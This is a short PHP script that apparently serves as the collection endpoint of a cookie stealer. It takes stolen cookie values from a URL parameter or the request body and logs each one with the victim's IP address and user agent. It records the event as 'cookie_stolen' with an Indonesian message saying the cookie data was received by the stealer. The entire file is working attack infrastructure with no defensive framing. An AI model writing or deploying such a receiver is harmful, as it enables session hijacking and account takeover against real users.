<?php
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/db.php';

$data = !empty($_GET['c'])
    ? '[' . date('Y-m-d H:i:s') . '] IP:' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . ' | UA:' . ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown') . ' | COOKIE:' . $_GET['c']
    : '[' . date('Y-m-d H:i:s') . '] IP:' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown') . ' | BODY:' . file_get_contents('php://input');

if (file_put_contents(COOKIE_LOG, $data . "\n", FILE_APPEND)) {
    logActivity('cookie_stolen', 'Cookie data diterima oleh stealer');
    http_response_code(200);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
} else {
    http_response_code(500);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error']);
}